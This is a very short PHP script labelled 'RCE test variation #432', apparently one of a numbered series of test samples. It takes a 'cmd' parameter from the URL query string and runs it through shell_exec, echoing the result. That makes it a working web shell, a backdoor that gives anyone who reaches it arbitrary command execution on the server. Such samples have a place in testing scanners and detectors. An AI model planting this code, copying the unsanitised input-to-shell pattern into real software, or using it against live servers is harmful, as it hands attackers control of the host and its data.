<?php
// RCE test variation #432
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>